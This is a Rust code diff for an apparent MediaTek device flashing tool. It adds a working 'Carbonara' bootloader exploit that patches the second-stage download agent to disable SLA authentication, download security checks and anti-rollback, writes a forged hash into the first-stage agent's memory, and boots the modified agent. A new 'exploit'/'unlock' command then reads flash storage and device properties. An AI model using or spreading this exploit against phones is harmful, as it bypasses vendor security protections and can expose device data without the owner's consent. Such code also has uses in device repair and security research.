@@ -30,6 +30,17 @@ const MAX_TIMEOUT: Duration = Duration::from_millis(10000);
 
 const HANDSHAKE_SEQ: [u8; 4] = [0xA0, 0x0A, 0x50, 0x05];
 
+// Payload file names (relative to exe or payloads/ dir)
+const PAYLOAD_HAKUJOUDAI: &str = "hakujoudai.bin";
+const PAYLOAD_DA_XML: &str = "da_xml.bin";
+const PAYLOAD_DA_X: &str = "da_x.bin";
+const PAYLOAD_BROM_DEFUSE: &str = "brom_defuse.bin";
+const PAYLOAD_SLA_XML: &str = "sla_xml.bin";
+const PAYLOAD_EXTLOADER_V5: &str = "extloader_v5.bin";
+const PAYLOAD_EXTLOADER_V6: &str = "extloader_v6.bin";
+const STOCK_DA_V5: &str = "MTK_DA_V5.bin";
+const STOCK_DA_V6: &str = "MTK_DA_V6.bin";
+
 #[derive(Debug, PartialEq, Eq, Copy, Clone, Serialize)]
 #[serde(rename_all = "lowercase")]
 enum ConnType {
@@ -787,10 +798,8 @@ const XF_MAGIC: u32 = 0xFEEEEEEF;
 const XF_SYNC_SIGNAL: u32 = 0x434E5953;
 
 fn dbg_dump(prefix: &str, data: &[u8]) {
-    if std::env::var("MTK_DEBUG").is_ok() {
-        let hex: String = data.iter().map(|b| format!("{b:02X}")).collect::<Vec<_>>().join(" ");
-        eprintln!("[dbg] {prefix}: {hex}");
-    }
+    let hex: String = data.iter().map(|b| format!("{b:02X}")).collect::<Vec<_>>().join(" ");
+    eprintln!("[dbg] {prefix}: {hex}");
 }
 
 #[derive(Debug, Clone, Copy)]
@@ -1047,6 +1056,22 @@ fn select_da2(data: &[u8], dacode: u16, hw_sub_code: u16) -> Result<(u32, Vec<u8
     Ok((region.addr, data[start..end].to_vec()))
 }
 
+/// Find payloads directory (next to exe, or in current dir).
+fn find_payloads_dir() -> Option<std::path::PathBuf> {
+    let exe_dir = std::env::current_exe().ok()
+        .and_then(|p| p.parent().map(|p| p.to_path_buf()));
+    if let Some(ref dir) = exe_dir {
+        let p = dir.join("payloads");
+        if p.is_dir() { return Some(p); }
+    }
+    let cwd = std::env::current_dir().ok();
+    if let Some(ref dir) = cwd {
+        let p = dir.join("payloads");
+        if p.is_dir() { return Some(p); }
+    }
+    None
+}
+
 fn xflash_da2_boot(
     device: &mut MtkDevice,
     da_file: &[u8],
@@ -1054,13 +1079,52 @@ fn xflash_da2_boot(
     hw_sub_code: u16,
     hw_code: u16,
 ) -> Result<(), String> {
+    let (da1_addr, da1, da1_sig) = select_da1(da_file, dacode, hw_sub_code)
+        .map_err(|e| format!("select DA1: {e}"))?;
     let (da2_addr, da2) = select_da2(da_file, dacode, hw_sub_code)
         .map_err(|e| format!("select DA2: {e}"))?;
 
     let mut xf = XFlash::new(device);
     xf.da1_sync().map_err(|e| e.to_string())?;
     xf.get_packet_length().map_err(|e| e.to_string())?;
-    xf.boot_to(da2_addr, &da2).map_err(|e| e.to_string())?;
+
+    // Try Carbonara exploit: write patched DA2 hash into DA1, boot patched DA2.
+    let mut used_exploit = false;
+    let mut final_da2 = da2.clone();
+    let mut final_da2_addr = da2_addr;
+
+    let payloads_dir = find_payloads_dir();
+    match carbonara_exploit(&mut xf, &da1, da1_addr, da1_sig, &da2, da2_addr, da2.len() as u32 - da2_sig) {
+        Ok(patched) => {
+            eprintln!("[exploit] Carbonara: patched DA2 ready");
+            final_da2 = patched;
+            used_exploit = true;
+        }
+        Err(e) => {
+            eprintln!("[exploit] Carbonara vendor DA: {e}");
+            // Try stock DA Carbonara
+            if let Some(ref pd) = payloads_dir {
+                match try_stock_carbonara(&mut xf, &da1, da1_addr, da1_sig, hw_code, hw_sub_code, pd) {
+                    Ok((stock_patched, stock_addr)) => {
+                        eprintln!("[exploit] Stock Carbonara: patched DA2 ready");
+                        final_da2 = stock_patched;
+                        final_da2_addr = stock_addr;
+                        used_exploit = true;
+                    }
+                    Err(e2) => {
+                        eprintln!("[exploit] Stock Carbonara: {e2}");
+                    }
+                }
+            }
+        }
+    }
+
+    // Boot DA2 (patched or original)
+    xf.boot_to(final_da2_addr, &final_da2).map_err(|e| e.to_string())?;
+
+    if used_exploit {
+        eprintln!("[exploit] DA2 booted with patched security checks");
+    }
 
     // DA2 needs time to initialize DRAM and storage.
     eprintln!("[dbg] DA2 sent, waiting for it to initialize...");
@@ -1191,6 +1255,346 @@ fn find_prop(data: &[u8], key: &str) -> Option<String> {
     let end = rest.iter().position(|&b| b == b'\n').unwrap_or(rest.len());
     let val = String::from_utf8_lossy(&rest[..end]).trim().to_string();
     Some(val)
+}
+
+// =============================================================================
+// EXPLOIT: Carbonara (DA2 hash modification)
+// =============================================================================
+
+/// Carbonara protection patterns — if found in DA1, it's patched.
+const CARBONARA_PROTECT: &[&[u8]] = &[
+    b"\x01\x01\x54\xE3\x01\x14\xA0\xE3",
+    b"\x08\x00\xA8\x52\xFF\x02\x08\xEB",
+    b"\x06\x9B\x4F\xF0\x80\x40\x02\xA9",
+    b"2nd DA address is invalid",
+    b"\x01\x01\x50\xE3\x01\x14\xA0\xE3",
+];
+
+fn carbonara_is_patched(da1: &[u8]) -> bool {
+    CARBONARA_PROTECT.iter().any(|pat| da1.windows(pat.len()).any(|w| w == *pat))
+}
+
+/// V6 hash offset: len(da1) - siglen - 0x30. Returns (offset, hash_mode=2 for SHA256).
+fn find_hash_offset_v6(da1: &[u8], siglen: u32) -> Option<(usize, usize)> {
+    let pos = da1.len() - siglen as usize - 0x30;
+    if pos + 0x30 > da1.len() {
+        return None;
+    }
+    let hash_area = &da1[pos..pos + 0x30];
+    // V6 uses SHA256 (32 bytes) — last 4 bytes should be zero.
+    if hash_area[28..32] == [0u8; 4] {
+        Some((pos, 2)) // hash_mode=2 => SHA256
+    } else {
+        None
+    }
+}
+
+/// Patch DA2: disable SLA, security checks, anti-rollback.
+fn patch_da2(da2: &mut [u8]) -> bool {
+    let mut patched = false;
+
+    // Patch "devc_get_sla_enabled_status" → force return 0 (MOVS R0, #0; BX LR)
+    if let Some(idx) = find_string(da2, b"devc_get_sla_enabled_status") {
+        if let Some(bl_off) = find_bl_after(da2, idx) {
+            if let Some(target) = resolve_bl_target(da2, bl_off) {
+                let force_ret: [u8; 4] = [0x00, 0x20, 0x70, 0x47]; // MOVS R0,#0; BX LR
+                da2[target..target + 4].copy_from_slice(&force_ret);
+                eprintln!("[exploit] patched SLA at DA2+0x{:X}", target);
+                patched = true;
+            }
+        }
+    }
+
+    // Patch "cmd_download" security check
+    if let Some(idx) = find_string(da2, b"cmd_download") {
+        if let Some(bl_off) = find_bl_after(da2, idx) {
+            if let Some(target) = resolve_bl_target(da2, bl_off) {
+                let patch: [u8; 2] = [0x23, 0x00]; // MOVS R3, #0
+                da2[target..target + 2].copy_from_slice(&patch);
+                eprintln!("[exploit] patched security at DA2+0x{:X}", target);
+                patched = true;
+            }
+        }
+    }
+
+    // Patch anti-rollback error constant (0xC0020053 → 0)
+    let ar_const = 0xC0020053u32.to_le_bytes();
+    if let Some(idx) = find_pattern(da2, &ar_const) {
+        da2[idx..idx + 4].copy_from_slice(&0u32.to_le_bytes());
+        eprintln!("[exploit] patched anti-rollback at DA2+0x{:X}", idx);
+        patched = true;
+    }
+
+    patched
+}
+
+fn find_string(data: &[u8], needle: &[u8]) -> Option<usize> {
+    data.windows(needle.len()).position(|w| w == needle)
+}
+
+fn find_bl_after(data: &[u8], start: usize) -> Option<usize> {
+    // Scan forward for next BL instruction (Thumb2: 0xF___ where hw1 >> 11 == 0b11110)
+    let mut off = start;
+    while off + 4 <= data.len() {
+        let hw1 = u16::from_le_bytes(data[off..off + 2].try_into().unwrap());
+        let hw2 = u16::from_le_bytes(data[off + 2..off + 4].try_into().unwrap());
+        if (hw1 >> 11) == 0b11110 && (hw2 & 0xD000) == 0xD000 {
+            return Some(off);
+        }
+        off += 2;
+    }
+    None
+}
+
+fn resolve_bl_target(data: &[u8], bl_off: usize) -> Option<usize> {
+    let hw1 = u16::from_le_bytes(data[bl_off..bl_off + 2].try_into().unwrap());
+    let hw2 = u16::from_le_bytes(data[bl_off + 2..bl_off + 4].try_into().unwrap());
+    let s = ((hw1 >> 10) & 1) as i32;
+    let j1 = ((hw2 >> 13) & 1) as u32;
+    let j2 = ((hw2 >> 11) & 1) as u32;
+    let i1 = (!(j1 ^ s as u32)) & 1;
+    let i2 = (!(j2 ^ s as u32)) & 1;
+    let imm10 = (hw1 & 0x3FF) as u32;
+    let imm11 = (hw2 & 0x7FF) as u32;
+    let mut offset = (s << 24) | (i1 << 23) | (i2 << 22) | (imm10 << 12) | (imm11 << 1);
+    if s != 0 {
+        offset |= 0xFE000000;
+    }
+    let offset_i32 = i32::from_le_bytes(offset.to_le_bytes());
+    let target = (bl_off as i32 + 4 + offset_i32) as usize;
+    if target < data.len() {
+        Some(target)
+    } else {
+        None
+    }
+}
+
+fn find_pattern(data: &[u8], pattern: &[u8]) -> Option<usize> {
+    data.windows(pattern.len()).position(|w| w == pattern)
+}
+
+/// Compute hash of data. mode: 0=MD5, 1=SHA1, 2=SHA256.
+fn compute_hash(mode: usize, data: &[u8]) -> Vec<u8> {
+    use std::io::Write;
+    match mode {
+        0 => {
+            let mut h = md5::Md5::new();
+            h.update(data);
+            h.finalize().to_vec()
+        }
+        1 => {
+            let mut h = sha1::Sha1::new();
+            h.update(data);
+            h.finalize().to_vec()
+        }
+        2 => {
+            let mut h = sha2::Sha256::new();
+            h.update(data);
+            h.finalize().to_vec()
+        }
+        _ => vec![],
+    }
+}
+
+/// Carbonara exploit: write patched DA2 hash into DA1, then boot patched DA2.
+fn carbonara_exploit(
+    xf: &mut XFlash<'_, MtkDevice>,
+    da1_data: &[u8],
+    da1_addr: u32,
+    da1_sig: u32,
+    da2_data: &[u8],
+    da2_addr: u32,
+    da2_sig: u32,
+) -> Result<Vec<u8>, String> {
+    eprintln!("[exploit] Carbonara...");
+
+    // Check if vendor DA1 is patched
+    if carbonara_is_patched(da1_data) {
+        eprintln!("[exploit] Vendor DA1 is patched against Carbonara");
+        // Try stock DA instead
+        return Err("DA1 patched".into());
+    }
+
+    // Find hash offset in DA1
+    let (hash_off, hash_mode) = find_hash_offset_v6(da1_data, da1_sig)
+        .ok_or("hash offset not found in DA1")?;
+    let hash_addr = da1_addr + hash_off as u32;
+    eprintln!("[exploit] hash offset=0x{:X}, hash_addr=0x{:X}, mode={}", hash_off, hash_addr, hash_mode);
+
+    // Patch DA2
+    let mut patched_da2 = da2_data.to_vec();
+    patch_da2(&mut patched_da2);
+
+    // Compute hash of patched DA2 (without signature)
+    let hash_len = da2_data.len() - da2_sig as usize;
+    let new_hash = compute_hash(hash_mode, &patched_da2[..hash_len]);
+    eprintln!("[exploit] new hash: {}", hex::encode(&new_hash));
+
+    // Write hash into DA1 via boot_to
+    xf.boot_to(hash_addr, &new_hash).map_err(|e| format!("boot_to hash failed: {e}"))?;
+    eprintln!("[exploit] hash written to DA1");
+
+    Ok(patched_da2)
+}
+
+/// Try loading stock DA for Carbonara exploit.
+fn try_stock_carbonara(
+    xf: &mut XFlash<'_, MtkDevice>,
+    da1_data: &[u8],
+    da1_addr: u32,
+    da1_sig: u32,
+    hw_code: u16,
+    hw_sub: u16,
+    payloads_dir: &std::path::Path,
+) -> Result<(Vec<u8>, u32), String> {
+    // Try V5 first, then V6
+    for name in &["MTK_DA_V5.bin", "MTK_DA_V6.bin"] {
+        let path = payloads_dir.join(name);
+        if !path.exists() {
+            continue;
+        }
+        let stock = std::fs::read(&path).map_err(|e| format!("read {name}: {e}"))?;
+        let entries = parse_da(&stock).map_err(|e| format!("parse {name}: {e}"))?;
+
+        let dacode = dacode_for(hw_code);
+        let entry = entries.iter().find(|e| e.hw_code == dacode && e.hw_sub_code == hw_sub)
+            .or_else(|| entries.iter().find(|e| e.hw_code == dacode));
+
+        if let Some(entry) = entry {
+            if entry.regions.len() >= 3 {
+                let da1_region = &entry.regions[1];
+                let da2_region = &entry.regions[2];
+                let stock_da1 = &stock[da1_region.offset as usize..(da1_region.offset + da1_region.length) as usize];
+                let stock_da2_raw = &stock[da2_region.offset as usize..(da2_region.offset + da2_region.length) as usize];
+
+                if !carbonara_is_patched(stock_da1) {
+                    eprintln!("[exploit] Stock {name} DA1 is VULNERABLE for MT6833!");
+                    // Use stock DA2 (without signature)
+                    let stock_da2 = &stock_da2_raw[..stock_da2_raw.len() - da2_region.sig_len as usize];
+                    let mut patched = stock_da2.to_vec();
+                    patch_da2(&mut patched);
+
+                    // Find hash offset in stock DA1
+                    if let Some((hash_off, hash_mode)) = find_hash_offset_v6(stock_da1, da1_region.sig_len) {
+                        let hash_addr = da1_addr + hash_off as u32;
+                        let new_hash = compute_hash(hash_mode, &patched);
+                        eprintln!("[exploit] Writing stock hash to DA1 @ 0x{:X}", hash_addr);
+                        xf.boot_to(hash_addr, &new_hash).map_err(|e| format!("boot_to: {e}"))?;
+                        return Ok((patched, da2_region.addr));
+                    }
+                }
+            }
+        }
+    }
+    Err("No vulnerable stock DA found".into())
+}
+
+fn do_exploit(args: &[String]) -> Response {
+    let da_path = args.iter().find(|a| !a.starts_with('-')).cloned();
+    let da_path = match da_path {
+        Some(p) => p,
+        None => return Response::error("Usage: mtk-backend exploit <da.bin>".into()),
+    };
+
+    let data = match std::fs::read(&da_path) {
+        Ok(d) => d,
+        Err(e) => return Response::error(format!("Failed to read DA file: {e}")),
+    };
+
+    let mut device = match find_and_open() {
+        Ok(dev) => dev,
+        Err(e) => return Response::error(e),
+    };
+
+    println!("Connecting...");
+    let mut proto = PlProtocol::new(&mut device);
+    if let Err(e) = proto.handshake() {
+        device.close();
+        return Response::error(format!("Handshake failed: {e}"));
+    }
+
+    let hw_code = proto.get_hw_code().unwrap_or(0);
+    let hw_sub_code = proto.get_hw_sw_ver().map(|(sub, _, _)| sub).unwrap_or(0);
+    let dacode = dacode_for(hw_code);
+
+    println!("HW Code: 0x{:04X} ({})", hw_code, chip_name(hw_code));
+
+    let (da1_addr, da1, da1_sig) = match select_da1(&data, dacode, hw_sub_code) {
+        Ok(v) => v,
+        Err(e) => { device.close(); return Response::error(e); }
+    };
+    let (da2_addr, da2) = match select_da2(&data, dacode, hw_sub_code) {
+        Ok(v) => v,
+        Err(e) => { device.close(); return Response::error(e); }
+    };
+
+    // Send DA1
+    if let Err(e) = proto.send_da(da1_addr, &da1, da1_sig) {
+        device.close();
+        return Response::error(format!("Send DA1 failed: {e}"));
+    }
+    if let Err(e) = proto.jump_da(da1_addr) {
+        device.close();
+        return Response::error(format!("Jump DA failed: {e}"));
+    }
+
+    let mut xf = XFlash::new(&mut device);
+    xf.da1_sync().unwrap_or_else(|e| eprintln!("[dbg] da1_sync: {e}"));
+    xf.get_packet_length().unwrap_or_else(|e| eprintln!("[dbg] get_packet_length: {e}"));
+
+    // Try Carbonara exploit
+    let payloads_dir = find_payloads_dir();
+    let mut patched = false;
+
+    println!("Trying Carbonara exploit...");
+    match carbonara_exploit(&mut xf, &da1, da1_addr, da1_sig, &da2, da2_addr, da2.len() as u32 - da2_sig) {
+        Ok(patched_da2) => {
+            println!("  Vendor DA patched, booting...");
+            if xf.boot_to(da2_addr, &patched_da2).is_ok() {
+                patched = true;
+                println!("  OK");
+            }
+        }
+        Err(e) => {
+            println!("  Vendor DA: {e}");
+            if let Some(ref pd) = payloads_dir {
+                println!("  Trying stock DA...");
+                match try_stock_carbonara(&mut xf, &da1, da1_addr, da1_sig, hw_code, hw_sub_code, pd) {
+                    Ok((stock_patched, stock_addr)) => {
+                        if xf.boot_to(stock_addr, &stock_patched).is_ok() {
+                            patched = true;
+                            println!("  OK");
+                        }
+                    }
+                    Err(e) => println!("  {e}"),
+                }
+            }
+        }
+    }
+
+    if patched {
+        println!("Exploit succeeded! Waiting for DA2...");
+        std::thread::sleep(Duration::from_secs(3));
+
+        match xf.detect_storage() {
+            Ok(st) => {
+                let gpt = xf.read_flash(0, 0x8000, st).unwrap_or_default();
+                let props = scan_system_props(&mut xf, st, &gpt);
+                println!();
+                println!("=== Device Info ===");
+                println!("Chipset: {}", chip_name(hw_code));
+                for (k, v) in &props {
+                    println!("{k}: {v}");
+                }
+            }
+            Err(e) => println!("Storage detect failed: {e}"),
+        }
+    } else {
+        println!("All exploits failed.");
+    }
+
+    device.close();
+    Response { status: "ok".into(), devices: None, handshake: None, da_upload: None, error: None }
 }
 
 fn do_detect() -> Response {
@@ -1746,6 +2150,7 @@ fn main() {
                 "detect" | "list" | "devices" => do_detect(),
                 "connect" | "handshake" | "info" => do_connect(rest),
                 "da" | "send-da" | "upload-da" => do_da(rest),
+                "exploit" | "unlock" => do_exploit(rest),
                 _ => Response::error(format!("Unknown command: {c}")),
             };
             print_response(&resp);
